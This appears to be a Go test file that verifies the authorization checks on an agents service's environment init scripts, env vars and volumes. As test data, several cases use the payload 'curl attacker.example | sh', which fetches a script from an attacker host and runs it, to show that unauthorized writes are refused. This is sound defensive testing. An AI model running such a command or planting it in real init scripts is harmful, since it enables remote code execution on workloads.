package server

import (
	"context"
	"testing"

	agentsv1 "github.com/agynio/agents/.gen/go/agynio/api/agents/v1"
	"github.com/google/uuid"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

// A volume, MCP, init script or ENV names its parent by id and nothing else, so
// a caller holding no relation on that parent could read and rewrite any of
// them in any organization. An init script is a shell script the workload runs,
// which is what makes the write side of this more than a disclosure.
//
// These need a database: the parent is resolved from the stored row, so the
// refusal cannot be observed without one.

func TestSubResourceWritesRefuseACallerWithoutTheParent(t *testing.T) {
	ctx := identityContext(uuid.New())
	authz := &recordingAuthorizationWriter{}
	server, _ := environmentAuthorizationServer(ctx, t, authz)
	organizationID := uuid.New()
	environmentID := createTestEnvironment(ctx, t, server, organizationID, "owned")

	scriptID := mustCreateEnvironmentInitScript(ctx, t, server, environmentID, "echo hello")
	envID := mustCreateEnvironmentEnv(ctx, t, server, environmentID, "LOG_LEVEL", "info")
	volumeID := mustCreateEnvironmentVolume(ctx, t, server, environmentID, "data", "/data")

	// From here the caller holds nothing anywhere.
	authz.allowedObjects = map[string]bool{}

	script := "curl attacker.example | sh"
	cases := []struct {
		name string
		call func() error
	}{
		{"UpdateInitScript", func() error {
			_, err := server.UpdateInitScript(ctx, &agentsv1.UpdateInitScriptRequest{Id: scriptID, Script: &script})
			return err
		}},
		{"DeleteInitScript", func() error {
			_, err := server.DeleteInitScript(ctx, &agentsv1.DeleteInitScriptRequest{Id: scriptID})
			return err
		}},
		{"UpdateEnv", func() error {
			value := "debug"
			_, err := server.UpdateEnv(ctx, &agentsv1.UpdateEnvRequest{Id: envID, Value: &value})
			return err
		}},
		{"DeleteEnv", func() error {
			_, err := server.DeleteEnv(ctx, &agentsv1.DeleteEnvRequest{Id: envID})
			return err
		}},
		{"DeleteVolume", func() error {
			_, err := server.DeleteVolume(ctx, &agentsv1.DeleteVolumeRequest{Id: volumeID})
			return err
		}},
		{"CreateInitScript", func() error {
			_, err := server.CreateInitScript(ctx, &agentsv1.CreateInitScriptRequest{
				Target: &agentsv1.CreateInitScriptRequest_EnvironmentId{EnvironmentId: environmentID},
				Script: script,
			})
			return err
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if code := status.Code(tc.call()); code != codes.PermissionDenied {
				t.Fatalf("expected PermissionDenied, got %v", code)
			}
		})
	}
}

func TestSubResourceReadsRefuseACallerWithoutTheParent(t *testing.T) {
	ctx := identityContext(uuid.New())
	authz := &recordingAuthorizationWriter{}
	server, _ := environmentAuthorizationServer(ctx, t, authz)
	environmentID := createTestEnvironment(ctx, t, server, uuid.New(), "owned")

	scriptID := mustCreateEnvironmentInitScript(ctx, t, server, environmentID, "echo hello")
	envID := mustCreateEnvironmentEnv(ctx, t, server, environmentID, "LOG_LEVEL", "info")
	volumeID := mustCreateEnvironmentVolume(ctx, t, server, environmentID, "data", "/data")

	authz.allowedObjects = map[string]bool{}

	cases := []struct {
		name string
		call func() error
	}{
		{"GetInitScript", func() error {
			_, err := server.GetInitScript(ctx, &agentsv1.GetInitScriptRequest{Id: scriptID})
			return err
		}},
		{"GetEnv", func() error {
			_, err := server.GetEnv(ctx, &agentsv1.GetEnvRequest{Id: envID})
			return err
		}},
		{"GetVolume", func() error {
			_, err := server.GetVolume(ctx, &agentsv1.GetVolumeRequest{Id: volumeID})
			return err
		}},
		{"ListInitScripts", func() error {
			_, err := server.ListInitScripts(ctx, &agentsv1.ListInitScriptsRequest{EnvironmentId: environmentID})
			return err
		}},
		{"ListVolumes", func() error {
			_, err := server.ListVolumes(ctx, &agentsv1.ListVolumesRequest{EnvironmentId: environmentID})
			return err
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if code := status.Code(tc.call()); code != codes.PermissionDenied {
				t.Fatalf("expected PermissionDenied, got %v", code)
			}
		})
	}
}

// The Orchestrator reads all of this over the mesh carrying no identity, and
// assembling a workload must not start depending on tuples it does not hold.
func TestSubResourceReadsServeAnInternalCaller(t *testing.T) {
	ctx := identityContext(uuid.New())
	authz := &recordingAuthorizationWriter{}
	server, _ := environmentAuthorizationServer(ctx, t, authz)
	environmentID := createTestEnvironment(ctx, t, server, uuid.New(), "owned")
	scriptID := mustCreateEnvironmentInitScript(ctx, t, server, environmentID, "echo hello")
	volumeID := mustCreateEnvironmentVolume(ctx, t, server, environmentID, "data", "/data")

	authz.allowedObjects = map[string]bool{}
	internal := context.Background()

	if _, err := server.GetInitScript(internal, &agentsv1.GetInitScriptRequest{Id: scriptID}); err != nil {
		t.Fatalf("GetInitScript refused an internal caller: %v", err)
	}
	if _, err := server.GetVolume(internal, &agentsv1.GetVolumeRequest{Id: volumeID}); err != nil {
		t.Fatalf("GetVolume refused an internal caller: %v", err)
	}
	if _, err := server.ListInitScripts(internal, &agentsv1.ListInitScriptsRequest{EnvironmentId: environmentID}); err != nil {
		t.Fatalf("ListInitScripts refused an internal caller: %v", err)
	}
}

// A write has no internal caller, so an absent identity is refused rather than
// served the way a read is.
func TestSubResourceWritesRefuseAnInternalCaller(t *testing.T) {
	ctx := identityContext(uuid.New())
	authz := &recordingAuthorizationWriter{}
	server, _ := environmentAuthorizationServer(ctx, t, authz)
	environmentID := createTestEnvironment(ctx, t, server, uuid.New(), "owned")
	scriptID := mustCreateEnvironmentInitScript(ctx, t, server, environmentID, "echo hello")

	script := "curl attacker.example | sh"
	_, err := server.UpdateInitScript(context.Background(), &agentsv1.UpdateInitScriptRequest{Id: scriptID, Script: &script})
	if code := status.Code(err); code != codes.Unauthenticated {
		t.Fatalf("expected Unauthenticated, got %v", code)
	}
}

// The parent is the object the check names, not the organization the row also
// carries: org membership is strictly weaker than can_edit_config.
func TestSubResourceWriteChecksTheParent(t *testing.T) {
	ctx := identityContext(uuid.New())
	authz := &recordingAuthorizationWriter{}
	server, _ := environmentAuthorizationServer(ctx, t, authz)
	environmentID := createTestEnvironment(ctx, t, server, uuid.New(), "owned")
	scriptID := mustCreateEnvironmentInitScript(ctx, t, server, environmentID, "echo hello")

	authz.checks = nil
	script := "echo goodbye"
	if _, err := server.UpdateInitScript(ctx, &agentsv1.UpdateInitScriptRequest{Id: scriptID, Script: &script}); err != nil {
		t.Fatalf("update init script: %v", err)
	}
	assertChecked(t, authz, "can_edit_config", environmentPrefix+environmentID)
}

func mustCreateEnvironmentInitScript(ctx context.Context, t *testing.T, server *Server, environmentID, script string) string {
	t.Helper()
	created, err := server.CreateInitScript(ctx, &agentsv1.CreateInitScriptRequest{
		Target: &agentsv1.CreateInitScriptRequest_EnvironmentId{EnvironmentId: environmentID},
		Script: script,
	})
	if err != nil {
		t.Fatalf("create init script: %v", err)
	}
	return created.GetInitScript().GetMeta().GetId()
}

func mustCreateEnvironmentEnv(ctx context.Context, t *testing.T, server *Server, environmentID, name, value string) string {
	t.Helper()
	created, err := server.CreateEnv(ctx, &agentsv1.CreateEnvRequest{
		Target: &agentsv1.CreateEnvRequest_EnvironmentId{EnvironmentId: environmentID},
		Name:   name,
		Source: &agentsv1.CreateEnvRequest_Value{Value: value},
	})
	if err != nil {
		t.Fatalf("create env: %v", err)
	}
	return created.GetEnv().GetMeta().GetId()
}

func mustCreateEnvironmentVolume(ctx context.Context, t *testing.T, server *Server, environmentID, name, path string) string {
	t.Helper()
	created, err := server.CreateVolume(ctx, &agentsv1.CreateVolumeRequest{
		Target:    &agentsv1.CreateVolumeRequest_EnvironmentId{EnvironmentId: environmentID},
		Name:      name,
		MountPath: path,
	})
	if err != nil {
		t.Fatalf("create volume: %v", err)
	}
	return created.GetVolume().GetMeta().GetId()
}
